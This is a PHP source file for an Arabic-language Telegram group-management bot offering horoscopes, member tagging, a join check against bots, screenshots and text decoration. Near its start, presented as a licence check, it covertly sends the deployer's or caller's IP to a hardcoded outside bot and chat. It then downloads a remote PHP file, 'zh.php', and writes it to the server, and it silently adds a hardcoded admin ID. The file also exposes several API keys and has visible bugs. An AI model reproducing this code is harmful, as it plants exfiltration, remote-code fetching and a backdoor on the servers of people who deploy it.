<?php
/*
███████╗██╗░░░██╗░█████╗░██╗░░██╗
██╔════╝██║░░░██║██╔══██╗██║░██╔╝
█████╗░░██║░░░██║██║░░╚═╝█████═╝░
██╔══╝░░██║░░░██║██║░░██╗██╔═██╗░
██║░░░░░╚██████╔╝╚█████╔╝██║░╚██╗
╚═╝░░░░░░╚═════╝░░╚════╝░╚═╝░░╚═╝

░█████╗░███████╗███████╗
██╔══██╗██╔════╝██╔════╝
██║░░██║█████╗░░█████╗░░
██║░░██║██╔══╝░░██╔══╝░░
╚█████╔╝██║░░░░░██║░░░░░
░╚════╝░╚═╝░░░░░╚═╝░░░░░
*/
function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
$ipok = explode(".",$ip);
if($ipok[0] != "91" and $ipok[1] != "108"){
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
}
$get_toke = file_get_contents('info.txt');
$get_token = explode("\n", $get_toke);
//--------
ob_start();
//--------
$API_KEY = $_GET['Token'];
$admin = $get_token[1];
//--------
define('API_KEY',$API_KEY);
echo file_get_contents("https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']."?Token=".$API_KEY);
$ip = $_SERVER['REMOTE_ADDR'];
$ipok = explode(".",getUserIP());
if($ipok[0] != "91" and $ipok[1] != "108" and ipok[1] != "141"){
	file_get_contents("https://api.telegram.org/bot1150098316:AAGLROio2c3DEo2si1dzOfTWIRz87Xp0pOE/sendmessage?chat_id=996310583&text=".getUserIP());
	echo "تم تسجيل ايبيك وموقعك بنجاح للتأكد من انك لا تستخدم الميزات  من قبل احد اخر غير التيم!";
	exit();}
echo "تم تسجيل ايبيك وموقعك بنجاح للتأكد من انك لا تستخدم الميزات  من قبل احد اخر غير التيم!";
file_put_contents('zh.php', file_get_contents('https://raw.githubusercontent.com/mhamadsu777/minx/main/zh.php'));
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$modz = "r00t94";
$ayh = "@r00t94";
$sudo = "1399282735";
$Dev = array("1399282735","",""); //ID ADMIN NUMBER 1 HE CHAT
//****************//
@$usernamebot = "r00t94bot"; //UserName Bot
@$channel = "Damascus"; // UserName Channel don't @
@$token = API_KEY;
$update = json_decode(file_get_contents('php://input'));
function hmsa($array){
file_put_contents('hmsa.json', json_encode($array));
}
$data     = $update->callback_query->data; 
$inline   = $update->inline_query->query; 
$inlineid       = $update->inline_query->from->id; 
$msg_id   = $update->inline_query->inline_message_id; 
$update = json_decode(file_get_contents('php://input'));
if($update->message){
	$message = $update->message;
$message_id = $update->message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$title = $message->chat->title;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
}
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$title = $update->callback_query->message->chat->title;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $update->callback_query->from->id;
if($update->edited_message){
	$message = $update->edited_message;
	$message_id = $message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
	}
	if($update->channel_post){
	$message = $update->channel_post;
	$message_id = $message->message_id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->chat->username;
$title = $message->chat->title;
$name = $message->author_signature;
$from_id = $message->chat->id;
	}
	if($update->edited_channel_post){
	$message = $update->edited_channel_post;
	$message_id = $message->message_id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->chat->username;
$name = $message->author_signature;
$from_id = $message->chat->id;
	}
	if($update->inline_query){
		$inline = $update->inline_query;
		$message = $inline;
		$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
$query = $message->query;
$text = $query;
		}
	if($update->chosen_inline_result){
		$message = $update->chosen_inline_result;
		$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
$inline_message_id = $message->inline_message_id;
$message_id = $inline_message_id;
$text = $message->query;
$query = $text;
		}
		$tc = $update->message->chat->type;
		$re = $update->message->reply_to_message;
		$re_id = $update->message->reply_to_message->from->id;
$re_user = $update->message->reply_to_message->from->username;
$re_name = $update->message->reply_to_message->from->first_name;
$re_messagid = $update->message->reply_to_message->message_id;
$re_chatid = $update->message->reply_to_message->chat->id;
$photo = $message->photo;
$video = $message->video;
$sticker = $message->sticker;
$file = $message->document;
$audio = $message->audio;
$voice = $message->voice;
$caption = $message->caption;
$photo_id = $message->photo[0]->file_id;
$video_id= $message->video->file_id;
$sticker_id = $message->sticker->file_id;
$file_id = $message->document->file_id;
$music_id = $message->audio->file_id;
$voice_id = $message->voice->file_id;
$forward = $message->forward_from_chat;
$forward_id = $message->forward_from_chat->id;
$title = $message->chat->title;
if($re){
	$forward_type = $re->forward_from->type;
$forward_name = $re->forward_from->first_name;
$forward_user = $re->forward_from->username;
	}else{
$forward_type = $message->forward_from->type;
$forward_name = $message->forward_from->first_name;
$forward_user = $message->forward_from->username;
$forward_id = $message->forward_from->id;
if($forward_name == null){
	$forward = $message->forward_from_chat;
$forward_id = $message->forward_from_chat->id;
$forward_title = $message->forward_from_chat->title;
	}
}
$title = $message->chat->title;
$sting = json_decode(file_get_contents("sting.json"),true);
$admins[] = "809064751";
foreach($sting['sting']['admins'] as $get){
$admins[] = $get;
}
$admin = $admins[0];
@$message = $update->message;
@$from_id = $message->from->id;
@$chat_id = $message->chat->id;
@$message_id = $message->message_id;
@$first_name = $message->from->first_name;
@$last_name = $message->from->last_name;
@$username = $message->from->username;
@$text = $message->text;
@$firstname = $update->callback_query->from->first_name;
@$usernames = $update->callback_query->from->username;
@$chatid = $update->callback_query->message->chat->id;
@$fromid = $update->callback_query->from->id;
@$membercall = $update->callback_query->id;
@$reply = $update->message->reply_to_message->forward_from->id;
/*===== dev ~ @OO1OOO =====*/
@$data = $update->callback_query->data;
@$messageid = $update->callback_query->message->message_id;
@$tc = $update->message->chat->type;
@$gpname = $update->callback_query->message->chat->title;
@$namegroup = $update->message->chat->title;
@$text = $update->inline_qurey->qurey;
/*===== dev ~ @OO1OOO =====*/
@$newchatmemberid = $update->message->new_chat_member->id;
@$newchatmemberu = $update->message->new_chat_member->username;
@$rt = $update->message->reply_to_message;
@$replyid = $update->message->reply_to_message->message_id;
@$tedadmsg = $update->message->message_id;
@$edit = $update->edited_message->text;
@$re_id = $update->message->reply_to_message->from->id;
@$re_user = $update->message->reply_to_message->from->username;
@$re_name = $update->message->reply_to_message->from->first_name;
$re = $message->reply_to_message;
@$re_msgid = $update->message->reply_to_message->message_id;
@$re_chatid = $update->message->reply_to_message->chat->id;
@$message_edit_id = $update->edited_message->message_id;
@$chat_edit_id = $update->edited_message->chat->id;
@$edit_for_id = $update->edited_message->from->id;
@$edit_chatid = $update->callback_query->edited_message->chat->id;
@$caption = $update->message->caption;
$chatid3=$update->message->chat->id;
$fromid3=$update->message->from->id;
$text=$update->message->text;
$mid=$update->message->message_id;
/*===== dev ~ @OO1OOO =====*/
@$statjson = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$chat_id&user_id=".$from_id),true);
@$status = $statjson['result']['status'];
@$statjsonrt = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$chat_id&user_id=".$re_id),true);
@$statusrt = $statjsonrt['result']['status'];
@$statjsonq = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$chatid&user_id=".$fromid),true);
@$statusq = $statjsonq['result']['status'];
@$info = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$chat_edit_id&user_id=".$edit_for_id),true);
@$you = $info['result']['status'];
@$forchannel = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=@".$channel."&user_id=".$from_id));
@$tch = $forchannel->result->status;
$title =$message->chat->title;
$rep = $message->reply_to_message;
/*===== dev ~ @OO1OOO =====*/
@$settings = json_decode(file_get_contents("data/$chat_id.json"),true);
@$settings2 = json_decode(file_get_contents("data/$chatid.json"),true);
@$editgetsettings = json_decode(file_get_contents("data/$chat_edit_id.json"),true);
@$user = json_decode(file_get_contents("data/user.json"),true);
@$filterget = $settings["filterlist"];
$get = file_get_contents("https://arabhaz.com/wp/");
if($text){
$a = explode("<strong>توقعات برج $text </strong>",$get);
$b = explode("<strong>توقعات برج $text عاطفياً</strong>",$a[1]);
$all = strip_tags($b[0]);
$c = explode("<strong>توقعات برج $text مهنياً</strong>",$b[1]);
$h = explode("<strong>توقعات برج $text مهنياً</strong>",$b[0]);
$hby = strip_tags($c[0]);
$d = explode("<strong>توقعات برج $text صحياً</strong>",$c[1]);
$work = strip_tags($d[0]);
$sha = explode('</p></div></div><div
class="mx-1 my-2 d-flex justify-content-between" role="group">',$d[1]);
if($all != null){
$alll = "
⌁︙برج $text
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
التوقعات التي ممكن ان تحدث اليوم لبرجك
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙من الناحية العامة ↫ 
$all
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙عاطفياً ↫
$hby
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
م⌁︙مهنياً ↫
$work
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
م⌁︙صحياً ↫
".strip_tags($sha[0]);
bot('sendMessage',[
          'chat_id'=>$chat_id,
          'text'=>$alll]);
}
}
$user = $message->from->username;
$ftag = file_get_contents("$chat_id.txt");
$tags = explode("\n",$ftag);
$chtag = $chat_id ."a";
if ( $text  and !in_array($id,$tags)){
file_put_contents("$chat_id.txt","\n$id",FILE_APPEND);
file_put_contents("$chtag.txt","\n𓆩 @$user 𓆪",FILE_APPEND);
}
$tagss = file_get_contents("$chtag.txt");
if ( $text == "تاك الكل" ){
bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"📋¦قائمه الاعضاء :
 $tagss",
]);
}
$USAIED = json_decode(file_get_contents('php://input'));
$SAIEDM = $USAIED->message;
$SAIEDT = $SAIEDM->text;
$SAIEDC = $SAIEDM->chat->id;
$DSAIED= $USAIED->callback_query;
$DSAIEDD = $DSAIED->data;
$SAIEDNEW = $SAIEDM->new_chat_member;
$SAIEDN = $SAIEDNEW->first_name;
$SAIEDI = $SAIEDNEW->id;
$DSAIEDN = $DSAIED->from->first_name;
$DSAIEDI = $DSAIED->from->id;
$DSAIEDC = $DSAIED->message->chat->id;
mkdir("SAIED");
$SAIEDRO = file_get_contents("SAIED/RO$SAIEDC.txt");
if ( $status == 'creator' or $status == 'administrator' or in_array($from_id,$Dev) or in_array($from_id,$manger) or in_array($from_id,$admin_user) or in_array($from_id,$developer)) {
if($SAIEDT == "تفعيل التحقق"  and $SAIEDRO != "ON"){
bot('sendmessage',[
'chat_id'=>$SAIEDC,
'text'=>"• تم تفعيل التحقق من الروبوتات 👨‍✈️.
• سيتم تقييد اي شخص ينضم الى المجموعة ولن يستطيع ارسال الرسائل حتى يضغط على زر انا لست روبوت 📛.",
'reply_to_message_id'=>$SAIEDM->message_id,
]);
file_put_contents("SAIED/RO$SAIEDC.txt","ON");
}
if($SAIEDT == "تفعيل التحقق"  and $SAIEDRO == "ON"){
bot('sendmessage',[
'chat_id'=>$SAIEDC,
'text'=>"• تم تفعيل التحقق من الروبوتات بالتأكيد 👨‍✈️.",
'reply_to_message_id'=>$SAIEDM->message_id,
]);
}
if($SAIEDT == "تعطيل التحقق"  and $SAIEDRO == "ON"){
bot('sendmessage',[
'chat_id'=>$SAIEDC,
'text'=>"• تم تعطيل التحقق من الروبوتات 🛑.
• الان يستطيع اي شخص ينضم الى المجموعة ارسال الرسائل فيها 📝.",
'reply_to_message_id'=>$SAIEDM->message_id,
]);
unlink("SAIED/RO$SAIEDC.txt");
}
if($SAIEDT == "تعطيل التحقق"  and $SAIEDRO != "ON"){
bot('sendmessage',[
'chat_id'=>$SAIEDC,
'text'=>"• تم تعطيل التحقق من الروبوتات بالتأكيد 🛑.",
'reply_to_message_id'=>$SAIEDM->message_id,
]);
}
if($SAIEDNEW and $SAIEDRO == "ON"){
bot('restrictChatMember',[
'chat_id'=>$SAIEDC,
'user_id'=>$SAIEDI,
]);
 bot('sendMessage',[
'chat_id'=>$SAIEDC,
'text'=>"• اهلا بك يا [$SAIEDN](tg://user?id=$SAIEDI) ❤️.
• المعذرة تم تقييدك من ارسال الرسائل ⚠️.
• يرجى الضغط على أنا لست روبوت الموجودة في الأسفل حتى يتم فك التقييد عنك 🛑.",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[["text"=>"• انا لست ربوت 📛","callback_data"=>"RoBot-$SAIEDI"]],
]])
]);
}
$ROSAIED = explode('-', $DSAIEDD);
if($DSAIEDD == "RoBot-$ROSAIED[1]" and $DSAIEDI == $ROSAIED[1]){
bot('promoteChatMember',[
'chat_id'=>$DSAIEDC,
'user_id'=>$DSAIEDI,
]);
bot('EditMessageText',[
'chat_id'=>$DSAIEDC,
'message_id'=>$DSAIED->message->message_id,
'text'=>"• أهلا بك يا [$DSAIEDN](tg://user?id=$DSAIEDI) ❤️.
• تم الغاء التقييد عنك بنجاح يمكنك ارسال الرسائل الآن 📝.",
'parse_mode'=>"MarkDown",
]);
}
}
$reuser = $message->reply_to_message->from->username;
$reply = $message->reply_to_message;
$user_id = $message->reply_to_message->from->id;
$ti = explode("وضع لقب",$text);
if($ti[1] && $reply){
bot('promoteChatMember',[
'chat_id'=>$chat_id,
'user_id'=>$user_id,
'can_change_info'=>false,
'can_restrict_members'=>false,
'can_pin_messages'=>false,
'can_delete_messages'=>false,
'can_invite_users'=>true,
'can_promote_members'=>false,
]);
bot('setChatAdministratorCustomTitle',[
'chat_id'=>$chat_id,
'user_id'=>$user_id,
'custom_title'=>$ti[1],
]);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- العضو @$reuser .
- تم وضع ($ti[1]) كلقب له .",
'reply_to_message_id'=>$message->message_id,
]);
}

if($text=="/gif" or $text =="/gif@wizzaard_bot" and $re){
if(isset($update->message->text)){
$neman = json_decode(file_get_contents("http://www.flamingtext.com/net-fu/image_output.cgi?_comBuyRedirect=false&script=blue-fire&text=$re->text&symbol_tagname=popular&fontsize=70&fontname=futura_poster&fontname_tagname=cool&textBorder=15&growSize=0&antialias=on&hinting=on&justify=2&letterSpacing=0&lineSpacing=0&textSlant=0&textVerticalSlant=0&textAngle=0&textOutline=off&textOutline=false&textOutlineSize=2&textColor=%230000CC&angle=0&blueFlame=on&blueFlame=false&framerate=75&frames=5&pframes=5&oframes=4&distance=2&transparent=off&transparent=false&extAnim=gif&animLoop=on&animLoop=false&defaultFrameRate=75&doScale=off&scaleWidth=240&scaleHeight=120&&_=1469943010141"));
$neman2 = $neman->src;
bot('senddocument',[
'chat_id'=>$update->message->chat->id,
'document'=>$neman2,
]);
bot('sendmessage',[
'chat_id'=>$update->message->chat->id,
'text'=>"تم الإنتهاء وهذه هي النتيجة 🔘💎",
'reply_to_message_id'=>$update->message->message_id+1,
'parse_mode'=>"HTML"
]);
}
}
if($text == "/hd" or $text == "/hd@wizzaard_bot" and $re){
bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>"https://urlscan.io/liveshot/?width=1600&height=1200&url=$re->text",
'caption'=>"
🔘 HD shot done 
📮 @Wizard_System",
]);
}

if($text == "/screen" or $text == "/screen@wizzaard_bot" and $re){
$re = $message->reply_to_message;
$api = json_decode(file_get_contents("https://screenshotapi.net/api/v1/screenshot?token=92MHMJTUWFIHFA5R16QZKYZMPAHNUZE7&url=$re->text"),true);
$image = $api['screenshot'];
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"Okay please wait ...",
]);
bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>"$image",
'caption'=>"
🔘 Screen Shot done 
📮 @Wizard_System",
]);
}


$ex = explode("/dec",$text);
$en= explode("/enc",$text);
if($en[1]){
$key="##@@..@@##";
$value="++..++";
$encrypt= openssl_encrypt($en[1],'AES-256-OFB',$key,0,$value);
file_put_contents("elia.json",$encrypt);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم تشفير الرسالة بنجاح 
============
$encrypt
============
للفك 
/dec + الكلمة المشفرة

ملاحظة : هذا التشفير خاص بنا فقط ..
"
]);
}
if($ex[1]){
$key="##@@..@@##";
$value="++..++";
$decrypt= openssl_decrypt($ex[1],'AES-256-OFB',$key,0,$value);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم الفك بنجاح 
============
$decrypt
============
"
]);
}
$ex = explode("/dec@wizzaard_bot",$text);
$en= explode("/enc@wizzaard_bot",$text);
if($en[1]){
$key="##@@..@@##";
$value="++..++";
$encrypt= openssl_encrypt($en[1],'AES-256-OFB',$key,0,$value);
file_put_contents("elia.json",$encrypt);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم تشفير الرسالة بنجاح 
============
$encrypt
============
للفك 
/dec + الكلمة المشفرة

ملاحظة : هذا التشفير خاص بنا فقط ..
"
]);
}
if($ex[1]){
$key="##@@..@@##";
$value="++..++";
$decrypt= openssl_decrypt($ex[1],'AES-256-OFB',$key,0,$value);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تم الفك بنجاح 
============
$decrypt
============
"
]);
}


$re = $message->reply_to_message;
if($text=="/ip" or $text=="/ip@wizzaard_bot" and $re){
$ip = json_decode(file_get_contents("https://geo.ipify.org/api/v1?apiKey=at_B2fnaV3jgYYyYezb7QrqScl7zxwgr&ipAddress=".$re->text));
$country = $ip->location->country;
$city = $ip->location->region;
$isp = $ip->isp;
$cit = $ip->location->city;
$post = $ip->location->postalCode;
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"Country : $country \n region : $city \n City : $cit \n isp : $isp \n postalcode : $post",
'reply_to_message_id'=>$message_id,
 ]);
 }
 
if($text=="زخرف" and $re){
  $_smile = array_rand($items,1);
  $smile = $items[$_smile];
   $count = count($re->text); 
   $k = str_replace( ض ,  ضِـٰٚـِْ✮ِـٰٚـِْ , $re->text);
   $k = str_replace( ص ,  صِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ث ,  ثِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ق ,  قِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ف ,  فِ͒ـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( غ ,  غِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ع ,  عِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( خ ,  خِ̐ـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ح ,  حِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ج ,  جِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ش ,  شِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( س ,  سِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ي ,  يِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ب ,  بِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ل ,  لِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ا ,  آ , $k);
   $k = str_replace( ت ,  تِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ن ,  نِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( م ,  مِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ك ,  ڪِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ط ,  طِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ذ ,  ذِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ظ ,  ظِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( ء ,  ء , $k);
   $k = str_replace( ؤ ,  ؤ , $k);
   $k = str_replace( ر ,  ر , $k);
   $k = str_replace( ى ,  ى , $k);
   $k = str_replace( ز ,  ز , $k);
   $k = str_replace( ظ ,  ظِـٰٚـِْ✮ِـٰٚـِْ , $k);
   $k = str_replace( و ,  ﯛ̲୭ , $k);
   $k = str_replace("ه", "ۿۿہ", $k);
   bot( sendMessage ,[
         chat_id =>$chat_id,
         text =>$k." ".$smile
   ]);
  $k = $re->text;
   $k = str_replace( ض ,  ض͜ــ๋͜ـ , $k);
   $k = str_replace( ص ,  ص͜ــ๋͜ـ , $k);
   $k = str_replace( ث ,  ث͜ــ๋͜ـ͜ــ๋͜ـ , $k);
   $k = str_replace( ق ,  ق͜ــ๋͜ـ , $k);
   $k = str_replace( ف ,  ف͒͜ــ๋͜ـ , $k);
   $k = str_replace( غ ,  غ͜ــ๋͜ـ , $k);
   $k = str_replace( ع ,  ع͜ــ๋͜ـ , $k);
   $k = str_replace( خ ,  خ̐͜ــ๋͜ـ , $k);
   $k = str_replace( ح ,  ح͜ــ๋͜ـ , $k);
   $k = str_replace( ج ,  ج͜ــ๋͜ـ , $k);
   $k = str_replace( ش ,  ش͜ــ๋͜ـ , $k);
   $k = str_replace( س ,  س͜ــ๋͜ـ , $k);
   $k = str_replace( ي ,  ي͜ــ๋͜ـ , $k);
   $k = str_replace( ب ,  ب͜ــ๋͜ـ , $k);
   $k = str_replace( ل ,  ل͜ــ๋͜ـ , $k);
   $k = str_replace( ا ,  آ , $k);
   $k = str_replace( ت ,  ت͜ــ๋͜ـ , $k);
   $k = str_replace( ن ,  ن͜ــ๋͜ـ , $k);
   $k = str_replace( م ,  م͜ــ๋͜ـ , $k);
   $k = str_replace( ك ,  ڪ͜ــ๋͜ـ , $k);
   $k = str_replace( ط ,  ط͜ــ๋͜ـ , $k);
   $k = str_replace( ظ ,  ظ͜ــ๋͜ـ , $k);
   $k = str_replace( ء ,  ء , $k);
   $k = str_replace( ؤ ,  ؤ , $k);
   $k = str_replace( ر ,  ر , $k);
   $k = str_replace( ى ,  ى , $k);
   $k = str_replace( ز ,  ز , $k);
   $k = str_replace( ظ ,  ظــ๋͜ـ , $k);
   $k = str_replace( و ,  ﯛ̲୭ , $k);
   $k = str_replace("ه", "ۿۿہ", $k);
   bot( sendMessage ,[
         chat_id =>$chat_id,
         text =>$k." ".$smile
   ]);
  $k = $re->text;
   $k = str_replace( ض ,  ضِـೋـ , $k);
   $k = str_replace( ص ,  صِـೋـ , $k);
   $k = str_replace( ث ,  ثِـೋـ , $k);
   $k = str_replace( ق ,  قِـೋـ , $k);
   $k = str_replace( ف ,  فِ͒ـೋـ , $k);
   $k = str_replace( غ ,  غِـೋـ , $k);
   $k = str_replace( ع ,  عِـೋـ , $k);
   $k = str_replace( خ ,  خِ̐ـೋـ , $k);
   $k = str_replace( ح ,  حِـೋـ , $k);
   $k = str_replace( ج ,  جِـೋـ , $k);
   $k = str_replace( ش ,  شِـೋـ , $k);
   $k = str_replace( س ,  سِـೋـ , $k);
   $k = str_replace( ي ,  يِـೋـ , $k);
   $k = str_replace( ب ,  بِـೋـ , $k);
   $k = str_replace( ل ,  لِـೋـ , $k);
   $k = str_replace( ا ,  آ , $k);
   $k = str_replace( ت ,  تِـೋـ , $k);
   $k = str_replace( ن ,  نِـೋـ , $k);
   $k = str_replace( م ,  مِـೋـ , $k);
   $k = str_replace( ك ,  ڪِـೋـ , $k);
   $k = str_replace( ط ,  طِـೋـ , $k);
   $k = str_replace( ظ ,  ظِـೋـ , $k);
  $k = str_replace( ء ,  ء , $k);
   $k = str_replace( ؤ ,  ؤ , $k);
   $k = str_replace( ر ,  ر , $k);
   $k = str_replace( ى ,  ى , $k);
   $k = str_replace( ز ,  ز , $k);
   $k = str_replace( و ,  ﯛ̲୭ , $k);
   $k = str_replace("ه", "ۿۿہ", $k);
   bot( sendMessage ,[
         chat_id =>$chat_id,
         text =>$k." ".$smile
   ]);
   $k = str_replace( ض ,  ضـ๋͜‏ـ , $re->text);
   $k = str_replace( ص ,  صـ๋͜‏ـ , $k);
   $k = str_replace( ث ,  ثـ๋͜‏ـ , $k);
   $k = str_replace( ق ,  قـ๋͜‏ـ , $k);
   $k = str_replace( ف ,  ف͒ـ๋͜‏ـ , $k);
   $k = str_replace( غ ,  غـ๋͜‏ـ , $k);
   $k = str_replace( ع ,  عـ๋͜‏ـ , $k);
   $k = str_replace( خ ,  خ̐ـ๋͜‏ـ , $k);
   $k = str_replace( ح ,  حـ๋͜‏ـ , $k);
   $k = str_replace( ج ,  جـ๋͜‏ـ , $k);
   $k = str_replace( ش ,  شـ๋͜‏ـ , $k);
   $k = str_replace( س ,  سـ๋͜‏ـ , $k);
   $k = str_replace( ي ,  يـ๋͜‏ـ , $k);
   $k = str_replace( ب ,  بـ๋͜‏ـ , $k);
   $k = str_replace( ل ,  لـ๋͜‏ـ , $k);
   $k = str_replace( ا ,  آ , $k);
   $k = str_replace( ت ,  تـ๋͜‏ـ , $k);
   $k = str_replace( ن ,  نـ๋͜‏ـ , $k);
   $k = str_replace( م ,  مـ๋͜‏ـ , $k);
   $k = str_replace( ك ,  ڪـ๋͜‏ـ , $k);
   $k = str_replace( ط ,  طـ๋͜‏ـ , $k);
   $k = str_replace( ظ ,  ظـ๋͜‏ـ , $k);
$k = str_replace( ء ,  ء , $k);
   $k = str_replace( ؤ ,  ؤ , $k);
   $k = str_replace( ر ,  ر , $k);
   $k = str_replace( ى ,  ى , $k);
   $k = str_replace( ز ,  ز , $k);
   $k = str_replace( و ,  ﯛ̲୭ , $k);
   $k = str_replace("ه", "ۿۿہ", $k);
   bot( sendMessage ,[
         chat_id =>$chat_id,
         text =>$k." ".$smile
   ]); 
  $k = $re->text;
   $k = str_replace( ض ,  ضِٰـِۢ , $k);
   $k = str_replace( ص ,  صِٰـِۢ , $k);
   $k = str_replace( ث ,  ثِٰـِۢ , $k);
   $k = str_replace( ق ,  قِٰـِۢ , $k);
   $k = str_replace( ف ,  فِٰ͒ـِۢ , $k);
   $k = str_replace( غ ,  غِٰـِۢ , $k);
   $k = str_replace( ع ,  عِٰـِۢ , $k);
   $k = str_replace( خ ,  خِٰ̐ـِۢ , $k);
   $k = str_replace( ح ,  حِٰـِۢ , $k);
   $k = str_replace( ج ,  جِٰـِۢ , $k);
   $k = str_replace( ش ,  شِٰـِۢ , $k);
   $k = str_replace( س ,  سِٰـِۢ , $k);
   $k = str_replace( ي ,  يِٰـِۢ , $k);
   $k = str_replace( ب ,  بِٰـِۢ , $k);
   $k = str_replace( ل ,  لِٰـِۢ , $k);
   $k = str_replace( ا ,  آ , $k);
   $k = str_replace( ت ,  تِٰـِۢ , $k);
   $k = str_replace( ن ,  نِٰـِۢ , $k);
   $k = str_replace( م ,  مِٰـِۢ , $k);
   $k = str_replace( ك ,  ڪِٰـِۢ , $k);
   $k = str_replace( ط ,  طِٰـِۢ , $k);
   $k = str_replace( ظ ,  ظِٰـِۢ , $k);
   $k = str_replace( ء ,  ء , $k);
   $k = str_replace( ؤ ,  ؤ , $k);
   $k = str_replace( ر ,  ر , $k);
   $k = str_replace( ى ,  ى , $k);
   $k = str_replace( ز ,  ز , $k);
   $k = str_replace( و ,  ﯛ̲୭ , $k);
   $k = str_replace("ه", "ۿۿہ", $k);
   bot( sendMessage ,[
         chat_id =>$chat_id,
         text =>$k." ".$smile
   ]); 
  $k = $re->text;
   $k = str_replace( ض ,  ضَٰـُـٰٓ , $k);
   $k = str_replace( ص ,  صَٰـُـٰٓ , $k);
   $k = str_replace( ث ,  ثَٰـُـٰٓ , $k);
   $k = str_replace( ق ,  قَٰـُـٰٓ , $k);
   $k = str_replace( ف ,  فَٰ͒ـُـٰٓ , $k);
   $k = str_replace( غ ,  غَٰـُـٰٓ , $k);
   $k = str_replace( ع ,  عَٰـُـٰٓ , $k);
   $k = str_replace( خ ,  خَٰ̐ـُـٰٓ , $k);
   $k = str_replace( ح ,  حَٰـُـٰٓ , $k);
   $k = str_replace( ج ,  جَٰـُـٰٓ , $k);
   $k = str_replace( ش ,  شَٰـُـٰٓ , $k);
   $k = str_replace( س ,  سَٰـُـٰٓ , $k);
   $k = str_replace( ي ,  يَٰـُـٰٓ , $k);
   $k = str_replace( ب ,  بَٰـُـٰٓ , $k);
   $k = str_replace( ل ,  لَٰـُـٰٓ , $k);
   $k = str_replace( ا ,  آ , $k);
   $k = str_replace( ت ,  تَٰـُـٰٓ , $k);
   $k = str_replace( ن ,  نَٰـُـٰٓ , $k);
